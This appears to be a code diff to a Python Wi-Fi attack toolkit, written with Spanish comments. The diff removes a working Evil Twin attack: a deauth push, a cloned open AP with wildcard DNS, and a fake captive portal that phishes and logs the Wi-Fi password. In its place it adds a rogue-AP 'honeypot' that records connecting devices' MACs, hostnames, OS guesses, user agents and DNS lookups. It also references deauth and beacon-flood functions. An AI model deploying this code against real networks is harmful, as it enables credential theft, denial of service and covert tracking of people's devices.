@@ -214,6 +214,25 @@ def log_attack(attack_type, target_bssid, result, target_ssid=None, target_clien
     except Exception:
         pass
 
+def log_honeypot(ssid, clients):
+    """Guarda la telemetria de cada dispositivo del honeypot en honeypot_log
+    (sin credenciales). No bloquea el flujo si la DB falla."""
+    try:
+        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
+        from db.models import get_session, HoneypotLog
+        s = get_session()
+        for c in clients:
+            s.add(HoneypotLog(
+                ssid=ssid, client_mac=(c.get("mac") or None),
+                vendor=(c.get("vendor") or None), client_ip=(c.get("ip") or None),
+                hostname=(c.get("hostname") or None), os_guess=(c.get("os") or None),
+                user_agent=((c.get("user_agent") or "")[:256] or None),
+                requests=c.get("hits", 0),
+                domains=(", ".join(c.get("domains", []))[:2000] or None)))
+        s.commit()
+    except Exception:
+        pass
+
 
 def check_handshake(cap_file):
     """Corre aircrack-ng brevemente contra el .cap para ver si detecto
@@ -460,25 +479,65 @@ def beacon_flood(iface, channel=6, seconds=20, pps=80, realistic=True):
             "detail": out[-400:]}, None
 
 
-# ───────────────────────── Evil Twin (AP falso + portal cautivo) ─────────────
-# SOLO laboratorio / redes propias. Levanta un AP ABIERTO con el MISMO nombre
-# que la red objetivo; el dispositivo victima se conecta y recibe un portal
-# cautivo ("reingrese su clave WiFi"); la clave enviada se captura. Un solo
-# adaptador (wlan1): primero un deauth corto para empujar al cliente, luego el
-# gemelo. El portal corre en :8080 (no-root) y se redirige el :80 con iptables.
-_ET_STATE = {"ssid": None, "password": None}
-_ET_EVENT = threading.Event()
-_ET_LOG = {"path": None}
+# ───────────────────── Honeypot de reconocimiento (AP + portal info) ─────────
+# SOLO laboratorio / auditoria autorizada. AP ABIERTO con un nombre a eleccion;
+# los dispositivos que se conectan quedan registrados para ANALISIS (MAC,
+# fabricante, IP, hostname, SO por User-Agent, dominios DNS). NO se piden ni se
+# guardan contrasenas: es telemetria para estadistica/reporte. Opcional: puente
+# de internet (NAT wlan0->wlan1) para que el cliente navegue y se vea trafico.
+_ET_STATE = {"ssid": None, "portal": None}
+_HP = {}                      # ip -> telemetria del portal (ua, hosts, hits)
+_HP_LOCK = threading.Lock()
 
-def _et_log(msg):
-    p = _ET_LOG.get("path")
-    if not p:
-        return
+def _config_get(key, default=None):
+    """Lee un valor de la tabla Config (flags del honeypot)."""
     try:
-        with open(p, "a") as f:
-            f.write(f"[{time.strftime('%H:%M:%S')}] PORTAL {msg}\n")
+        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
+        from db.models import get_session, Config
+        row = get_session().get(Config, key)
+        return row.value if (row and row.value is not None) else default
     except Exception:
-        pass
+        return default
+
+def _hp_record_http(ip, ua, host):
+    if not ip:
+        return
+    now = time.time()
+    with _HP_LOCK:
+        c = _HP.get(ip)
+        if not c:
+            c = {"ua": "", "hosts": set(), "hits": 0, "first": now, "last": now}
+            _HP[ip] = c
+        c["hits"] += 1
+        c["last"] = now
+        if ua and not c["ua"]:
+            c["ua"] = ua[:250]
+        if host:
+            c["hosts"].add(host[:80])
+
+def _portal_html(ssid):
+    """Carga la plantilla elegida (data/portals/<archivo>) o una por defecto.
+    Reemplaza {{SSID}}. Portal SOLO informativo (sin formulario de credenciales)."""
+    name = _ET_STATE.get("portal")
+    html = None
+    if name:
+        path = os.path.join(os.path.expanduser("~/piscanlvgl/data/portals"), name)
+        if os.path.exists(path):
+            try:
+                with open(path, "r", errors="replace") as f:
+                    html = f.read()
+            except Exception:
+                html = None
+    if not html:
+        html = ("<!doctype html><html><head><meta charset='utf-8'>"
+                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+                "<title>{{SSID}}</title></head><body style='font-family:sans-serif;"
+                "max-width:420px;margin:48px auto;padding:0 16px'>"
+                "<h2>Bienvenido a {{SSID}}</h2>"
+                "<p>Conexion establecida. Red de cortesia.</p>"
+                "<p style='color:#888;font-size:12px;margin-top:24px'>"
+                "Prueba de laboratorio.</p></body></html>")
+    return html.replace("{{SSID}}", ssid or "WiFi")
 
 class _ETServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     allow_reuse_address = True
@@ -488,56 +547,27 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a):
         pass  # no ensuciar stdout (romperia el JSON del contrato)
 
-    def _send_portal(self):
-        ssid = _ET_STATE.get("ssid") or "su red WiFi"
-        html = ("<!doctype html><html><head><meta charset='utf-8'>"
-                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
-                "<title>Actualizacion de red</title></head>"
-                "<body style='font-family:sans-serif;max-width:420px;margin:40px auto;padding:0 16px'>"
-                "<h2>Reconexion requerida</h2>"
-                f"<p>Su router <b>{ssid}</b> requiere reingresar la contrasena "
-                "WiFi para continuar con la conexion.</p>"
-                "<form method='POST' action='/'>"
-                "<input type='password' name='password' placeholder='Contrasena WiFi' "
-                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box' required>"
-                "<button type='submit' style='width:100%;padding:12px;font-size:16px;"
-                "margin-top:12px'>Conectar</button></form>"
-                "<p style='color:#888;font-size:12px;margin-top:24px'>Prueba de laboratorio.</p>"
-                "</body></html>")
-        data = html.encode("utf-8")
+    def _serve(self):
+        ip = self.client_address[0] if self.client_address else None
+        ua = self.headers.get("User-Agent", "")
+        host = self.headers.get("Host", "")
+        _hp_record_http(ip, ua, host)   # telemetria: NO credenciales
+        data = _portal_html(_ET_STATE.get("ssid")).encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(data)))
         self.end_headers()
-        self.wfile.write(data)
+        try:
+            self.wfile.write(data)
+        except Exception:
+            pass
 
     def do_GET(self):
-        # Captive portal: cualquier URL devuelve el portal (y responde a los
-        # chequeos de conectividad de Android/iOS para disparar el "iniciar sesion").
-        _et_log(f"GET {self.path} host={self.headers.get('Host')}")
-        self._send_portal()
+        self._serve()
 
     def do_POST(self):
-        try:
-            length = int(self.headers.get("Content-Length", 0))
-            body = self.rfile.read(length).decode("utf-8", "replace")
-            params = urllib.parse.parse_qs(body)
-            pw = (params.get("password") or [""])[0].strip()
-        except Exception as e:
-            body = f"(error {e})"
-            pw = ""
-        _et_log(f"POST {self.path} body={body[:120]!r} pw={'SI' if pw else 'no'}")
-        if pw:
-            _ET_STATE["password"] = pw
-            _ET_EVENT.set()
-        msg = ("<!doctype html><html><head><meta charset='utf-8'></head>"
-               "<body style='font-family:sans-serif;text-align:center;margin-top:60px'>"
-               "<h3>Gracias. Reconectando...</h3></body></html>").encode("utf-8")
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(msg)))
-        self.end_headers()
-        self.wfile.write(msg)
+        # No se leen credenciales: solo se cuenta el hit y se sirve la pagina.
+        self._serve()
 
 def _first_existing(*paths):
     for p in paths:
@@ -545,11 +575,16 @@ def _first_existing(*paths):
             return p
     return None
 
+def _nft():
+    return _first_existing("/usr/sbin/nft", "/sbin/nft", "/usr/bin/nft")
+
+def _ipt():
+    return _first_existing("/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables")
+
 def _et_redirect_add(iface):
-    """Redirige el TCP:80 del cliente -> :8080 (portal no-root). Trixie usa
-    nftables por defecto (iptables suele no estar), asi que probamos nft
-    primero y caemos a iptables si existe. Devuelve 'nft'/'iptables'/None."""
-    nft = _first_existing("/usr/sbin/nft", "/sbin/nft", "/usr/bin/nft")
+    """Redirige el TCP:80 del cliente -> :8080 (portal no-root). nft (trixie) o
+    iptables. Devuelve 'nft'/'iptables'/None."""
+    nft = _nft()
     if nft:
         _run(['sudo', nft, 'add', 'table', 'ip', 'piscan_et'])
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_et', 'prerouting',
@@ -558,7 +593,7 @@ def _et_redirect_add(iface):
                   'iifname', iface, 'tcp', 'dport', '80', 'redirect', 'to', ':8080'])
         if r is not None and r.returncode == 0:
             return 'nft'
-    ipt = _first_existing("/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables")
+    ipt = _ipt()
     if ipt:
         r = _run(['sudo', ipt, '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
                   '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '8080'])
@@ -567,17 +602,43 @@ def _et_redirect_add(iface):
     return None
 
 def _et_redirect_del(iface):
-    """Quita el redirect (ambos metodos, best-effort)."""
-    nft = _first_existing("/usr/sbin/nft", "/sbin/nft", "/usr/bin/nft")
+    nft = _nft()
     if nft:
         _run(['sudo', nft, 'delete', 'table', 'ip', 'piscan_et'])
-    ipt = _first_existing("/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables")
+    ipt = _ipt()
     if ipt:
         _run(['sudo', ipt, '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
               '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '8080'])
 
-def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd):
-    """Baja todo el Evil Twin y restaura wlan1 a managed. Best-effort."""
+def _et_bridge_add(iface, uplink):
+    """Puente de internet: NAT (masquerade) de `uplink` (wlan0, con internet)
+    hacia `iface` (wlan1/honeypot) + ip_forward. Devuelve True si quedo."""
+    _run(['sudo', '/usr/sbin/sysctl', '-w', 'net.ipv4.ip_forward=1'])
+    nft = _nft()
+    if nft:
+        _run(['sudo', nft, 'add', 'table', 'ip', 'piscan_nat'])
+        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'post',
+              '{ type nat hook postrouting priority 100 ; }'])
+        r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'post',
+                  'oifname', uplink, 'masquerade'])
+        return r is not None and r.returncode == 0
+    ipt = _ipt()
+    if ipt:
+        r = _run(['sudo', ipt, '-t', 'nat', '-A', 'POSTROUTING', '-o', uplink, '-j', 'MASQUERADE'])
+        return r is not None and r.returncode == 0
+    return False
+
+def _et_bridge_del(iface, uplink):
+    nft = _nft()
+    if nft:
+        _run(['sudo', nft, 'delete', 'table', 'ip', 'piscan_nat'])
+    ipt = _ipt()
+    if ipt:
+        _run(['sudo', ipt, '-t', 'nat', '-D', 'POSTROUTING', '-o', uplink, '-j', 'MASQUERADE'])
+    _run(['sudo', '/usr/sbin/sysctl', '-w', 'net.ipv4.ip_forward=0'])
+
+def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink):
+    """Baja todo el honeypot y restaura wlan1 a managed. Best-effort."""
     try:
         if httpd:
             httpd.shutdown()
@@ -585,12 +646,13 @@ def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd):
     except Exception:
         pass
     _et_redirect_del(iface)
+    if bridge:
+        _et_bridge_del(iface, uplink)
     for p in procs:
         try:
             p.terminate()
         except Exception:
             pass
-    # por si quedaron colgados
     _run(['sudo', '/usr/bin/pkill', '-f', 'hostapd'])
     _run(['sudo', '/usr/bin/pkill', '-f', 'dnsmasq'])
     _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
@@ -602,32 +664,49 @@ def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd):
             pass
     disable_monitor(iface)   # vuelve a managed + up
 
+def _hp_parse_leases(logtext):
+    """De la salida de dnsmasq (DHCPACK) -> {ip: (mac, hostname)}."""
+    leases = {}
+    for m in re.finditer(r'DHCPACK\([^)]*\)\s+([0-9.]+)\s+([0-9a-fA-F:]{17})\s*(\S*)', logtext):
+        ip, mac, host = m.group(1), m.group(2).upper(), (m.group(3) or '').strip()
+        leases[ip] = (mac, host if (host and host != '*') else '')
+    return leases
+
+def _hp_parse_domains(logtext):
+    """De dnsmasq log-queries -> {ip: set(dominios)}."""
+    dom = {}
+    for m in re.finditer(r'query\[[A-Z]+\]\s+(\S+)\s+from\s+([0-9.]+)', logtext):
+        dom.setdefault(m.group(2), set()).add(m.group(1))
+    return dom
+
+def _os_guess(ua, hints):
+    s = (ua or "").lower()
+    if "android" in s: return "Android"
+    if "iphone" in s or "ipad" in s or "cfnetwork" in s or "darwin" in s: return "iOS"
+    if "windows" in s: return "Windows"
+    if "mac os" in s or "macintosh" in s: return "macOS"
+    if "linux" in s: return "Linux"
+    h = " ".join(hints or [])
+    if "gstatic" in h or "googleapis" in h or "android" in h: return "Android"
+    if "apple.com" in h or "aaplimg" in h: return "iOS"
+    if "msftconnecttest" in h or "msftncsi" in h or "windows" in h: return "Windows"
+    return "?"
+
 def evil_twin(iface, ssid, bssid, channel, seconds=120):
-    """Evil Twin con portal cautivo. Devuelve (data, err). data trae
-    'password' (capturada o None) y 'clients'. SOLO laboratorio."""
-    # Canal REAL del AP objetivo (para el deauth) y canal del GEMELO (2.4,
-    # hw_mode=g, lo mas fiable; lo que importa para la victima es el NOMBRE).
-    try:
-        real_ch = int(channel)
-    except (ValueError, TypeError):
-        real_ch = 6
-    ap_ch = real_ch if 1 <= real_ch <= 13 else 6
-    ch = ap_ch   # el resto del codigo usa 'ch' para el AP
+    """Honeypot de reconocimiento: AP abierto con `ssid` + portal informativo
+    que registra TELEMETRIA de los que se conectan (MAC/fabricante/IP/hostname/
+    SO/dominios), SIN credenciales. Lee de Config honeypot_bridge (0/1) y
+    honeypot_portal (plantilla). Devuelve (data, err) con
+    data={ssid, count, clients:[...], bridge, log}. SOLO laboratorio."""
+    ap_ch = 6                 # AP abierto en 2.4 (hw_mode=g), lo mas fiable
+    uplink = "wlan0"          # interfaz con internet para el puente
+    bridge = (_config_get("honeypot_bridge", "0") == "1")
 
     _ET_STATE["ssid"] = ssid
-    _ET_STATE["password"] = None
-    _ET_EVENT.clear()
+    _ET_STATE["portal"] = _config_get("honeypot_portal", None)
+    with _HP_LOCK:
+        _HP.clear()
 
-    # 1) Empujon: deauth corto al AP real (en SU canal real) para que el cliente
-    #    se suelte y busque el SSID. Un solo adaptador -> secuencial: deauth,
-    #    luego el AP gemelo en 2.4.
-    if bssid:
-        try:
-            deauth(bssid, real_ch, 15, iface, duration=0)  # rafaga corta en el canal real
-        except Exception:
-            pass
-
-    # 2) Dejar wlan1 en managed/up y asignarle la IP de gateway del AP.
     disable_monitor(iface)
     _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
 
@@ -636,14 +715,12 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
     procs = []
     httpd = None
 
-    # Log de diagnostico (hostapd/dnsmasq a DEVNULL no dejaban ver fallos).
     logpath = os.path.expanduser("~/piscanlvgl/data/captures/evil_twin.log")
     try:
         os.makedirs(os.path.dirname(logpath), exist_ok=True)
         logf = open(logpath, "w")
     except Exception:
         logf = open(os.devnull, "w")
-    _ET_LOG["path"] = logpath   # el handler del portal apendea GET/POST aqui
 
     def log(msg):
         try:
@@ -652,40 +729,40 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         except Exception:
             pass
 
-    def diag(cmd):
-        r = _run(cmd)
-        out = ((r.stdout or '') + (r.stderr or '')) if r else '(sin salida)'
-        log(f"$ {' '.join(cmd)}\n{out}")
-
     try:
-        # hostapd (AP abierto con el nombre objetivo)
+        # hostapd (AP abierto con el nombre elegido)
         hf = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_hostapd_',
                                          suffix='.conf', delete=False)
         hf.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
-                 f"hw_mode=g\nchannel={ch}\n")
+                 f"hw_mode=g\nchannel={ap_ch}\n")
         hf.close()
         hostapd_conf = hf.name
-        log(f"hostapd ssid={ssid} ch={ch}")
+        log(f"honeypot ssid={ssid} ch={ap_ch} bridge={bridge} portal={_ET_STATE['portal']}")
         procs.append(subprocess.Popen(['sudo', '/usr/sbin/hostapd', hostapd_conf],
                                       stdout=logf, stderr=logf))
-        time.sleep(4)  # que levante el AP
+        time.sleep(4)
         if procs[-1].poll() is not None:
             log("hostapd murio al arrancar")
-            _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
+            _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink)
             logf.close()
             return None, "hostapd no pudo levantar el AP (ver data/captures/evil_twin.log)"
 
-        # IP de gateway en wlan1 (hostapd ya la dejo en modo AP)
-        diag(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
-        diag(['sudo', '/usr/bin/ip', 'addr', 'show', iface])
+        _run(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
 
-        # dnsmasq (DHCP + DNS wildcard -> todo al portal)
+        # puente de internet (opcional)
+        if bridge:
+            log(f"bridge NAT {uplink}->{iface}: {_et_bridge_add(iface, uplink)}")
+
+        # dnsmasq: DHCP + log de consultas. Con puente, DNS real (internet);
+        # sin puente, todo al portal (address=/#/).
+        base = (f"interface={iface}\nbind-interfaces\nlisten-address=10.0.0.1\n"
+                "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
+                "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nlog-queries\n")
+        base += ("server=8.8.8.8\nserver=1.1.1.1\n" if bridge
+                 else "no-resolv\naddress=/#/10.0.0.1\n")
         df = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_dnsmasq_',
                                          suffix='.conf', delete=False)
-        df.write(f"interface={iface}\nbind-interfaces\nlisten-address=10.0.0.1\n"
-                 "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
-                 "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
-                 "no-resolv\naddress=/#/10.0.0.1\n")
+        df.write(base)
         df.close()
         dnsmasq_conf = df.name
         log("lanzando dnsmasq")
@@ -693,35 +770,67 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
                                       stdout=logf, stderr=logf))
         time.sleep(1.5)
         if procs[-1].poll() is not None:
-            log("dnsmasq murio al arrancar (probable conflicto de puerto 53/67)")
+            log("dnsmasq murio (conflicto de puerto 53/67?)")
 
-        # redirigir el :80 al portal (:8080, no-root). nft (trixie) o iptables.
-        method = _et_redirect_add(iface)
-        log(f"redirect 80->8080 via: {method}")
+        # Sin puente: forzar el portal (redirect :80). Con puente dejamos navegar.
+        if not bridge:
+            log(f"redirect 80->8080 via: {_et_redirect_add(iface)}")
 
-        # portal cautivo en :8080
         try:
             httpd = _ETServer(("0.0.0.0", 8080), _ETPortalHandler)
             threading.Thread(target=httpd.serve_forever, daemon=True).start()
-            log("portal :8080 arriba (threading)")
+            log("portal :8080 arriba")
         except Exception as e:
             log(f"portal :8080 FALLO: {e}")
 
-        log(f"esperando captura hasta {seconds}s...")
-        # 3) Esperar hasta capturar la clave o agotar el tiempo
-        _ET_EVENT.wait(timeout=max(10, int(seconds)))
-        log("fin de espera; password capturada: %s" % bool(_ET_STATE.get("password")))
+        log(f"honeypot activo {seconds}s...")
+        time.sleep(max(10, int(seconds)))
+        log("fin del honeypot")
 
     finally:
-        _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
-        try:
-            logf.close()
-        except Exception:
-            pass
+        _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink)
 
-    pw = _ET_STATE.get("password")
-    return {"ssid": ssid, "channel": ch, "password": pw,
-            "captured": bool(pw), "log": logpath}, None
+    # Analisis: fusionar leases DHCP + hits del portal + dominios DNS
+    try:
+        with open(logpath, "r", errors="replace") as f:
+            logtext = f.read()
+    except Exception:
+        logtext = ""
+    leases = _hp_parse_leases(logtext)
+    domains = _hp_parse_domains(logtext)
+
+    prefixes = {mac.replace(":", "")[:6] for (mac, _h) in leases.values() if mac}
+    vendors = _resolve_vendors(prefixes) if prefixes else {}
+
+    clients = []
+    for ip in (set(leases.keys()) | set(_HP.keys())):
+        mac, host = leases.get(ip, ("", ""))
+        pref = mac.replace(":", "")[:6] if mac else ""
+        if pref and pref in vendors:
+            vendor = vendors[pref]
+        elif mac:
+            try:
+                vendor = "(aleatoria)" if (int(pref[:2], 16) & 0x02) else "?"
+            except ValueError:
+                vendor = "?"
+        else:
+            vendor = "?"
+        hp = _HP.get(ip, {})
+        hosts = sorted(hp.get("hosts", set()))
+        doms = sorted(domains.get(ip, set()))
+        clients.append({
+            "ip": ip, "mac": mac, "vendor": vendor, "hostname": host,
+            "os": _os_guess(hp.get("ua", ""), hosts + doms),
+            "user_agent": hp.get("ua", ""), "hits": hp.get("hits", 0),
+            "domains": doms[:40],
+        })
+
+    try:
+        logf.close()
+    except Exception:
+        pass
+    return {"ssid": ssid, "count": len(clients), "clients": clients,
+            "bridge": bridge, "log": logpath}, None
 
 
 # OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
@@ -1116,13 +1225,13 @@ def main():
         iface_et = sys.argv[6] if len(sys.argv) > 6 else 'wlan1'
         data, err = evil_twin(iface_et, ssid, bssid, channel, seconds)
         if err:
-            log_attack("evil_twin", bssid, "fail", target_ssid=ssid, details=err)
+            log_attack("honeypot", "", "fail", target_ssid=ssid, details=err)
             print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_et)}))
         else:
-            got = data["captured"]
-            log_attack("evil_twin", bssid, "captured" if got else "nada",
-                       target_ssid=ssid,
-                       details=(f"pass={data['password']}" if got else "sin captura"))
+            n = data["count"]
+            log_honeypot(ssid, data["clients"])   # telemetria por dispositivo
+            log_attack("honeypot", "", "done", target_ssid=ssid,
+                       details=f"clientes={n} bridge={data.get('bridge')}")
             out = {"ok": True}
             out.update(data)
             print(json.dumps(out))
